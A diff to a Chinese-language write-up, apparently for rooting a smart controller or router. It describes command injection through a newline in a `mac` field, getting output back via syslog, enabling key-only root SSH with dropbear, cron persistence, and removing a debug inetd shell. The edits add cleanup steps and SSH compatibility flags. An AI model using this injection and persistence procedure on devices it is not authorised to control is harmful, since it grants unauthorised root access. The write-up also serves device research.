@@ -144,6 +144,8 @@ curl -s -X POST \
 
 `mac` 字段为 `AA\n<CMD>\n`，注入的命令与 `macfilter commit` 换行隔开并行执行。
 
+注意：每次 `scene_setting` 都会在 `/etc/smartcontroller/SmartTask.sc`（sec_cfg 分区，~6MB）里持久化一条场景记录——**用完必须 `scene_delete`**（exploit.py 已自动在 `scene_start` 后删除）。老版本残留可用 `{"command":"reset_scenes"}` 一键清空（会删除该设备全部场景）。
+
 ### 3. 执行结果读回
 
 `/tmp/messages` 会进 syslog 打包文件。先让 daemon 把文件内容 cp 过去，再下载：
@@ -202,7 +204,7 @@ cp /data/authorized_keys /etc/dropbear/authorized_keys
 /usr/sbin/dropbear -s -r /data/dropbear_rsa_host_key  # -s 禁用密码登录，仅密钥
 ```
 
-`ssh -i 私钥 root@<ip>` 即通。**不要加 `-B`**（允许空密码登录是事故源）；如果确实要密码登录，root 密码哈希得用 `$1$` md5（此固件 musl 不支持 `$6$` sha512）。
+`ssh -i 私钥 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa root@<ip>` 即通（stock dropbear 只给 ssh-rsa，OpenSSH ≥8.8 默认拒绝，需要这两个兼容参数）。**不要加 `-B`**（允许空密码登录是事故源）；如果确实要密码登录，root 密码哈希得用 `$1$` md5（此固件 musl 不支持 `$6$` sha512）。
 
 ### 7. 持久化（看门狗只管 dropbear）
 
@@ -212,7 +214,7 @@ cp /data/authorized_keys /etc/dropbear/authorized_keys
 #!/bin/sh
 mkdir -p /etc/dropbear
 cp /data/authorized_keys /etc/dropbear/authorized_keys 2>/dev/null
-pgrep -x dropbear >/dev/null 2>&1 || \
+pidof dropbear >/dev/null 2>&1 || \
     /usr/sbin/dropbear -s -r /data/dropbear_rsa_host_key
 ```
 
@@ -222,10 +224,10 @@ pgrep -x dropbear >/dev/null 2>&1 || \
 * * * * * sh /data/persist.sh >/dev/null 2>&1
 ```
 
-收尾：先用真实私钥确认能登录（`ssh -i 私钥 root@<ip> id` 返回 `uid=0`），**确认通过后**再关掉调试 shell——只看 :22 监听或 banner 不算数：
+收尾：先用真实私钥确认能登录（`ssh -i 私钥 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa root@<ip> id` 返回 `uid=0`），**确认通过后**再关掉调试 shell——只看 :22 监听或 banner 不算数：
 
 ```sh
-for p in $(pgrep -x inetd); do kill $p; done
+for p in $(pidof inetd); do kill $p; done
 rm -f /etc/inetd.conf
 ```
 
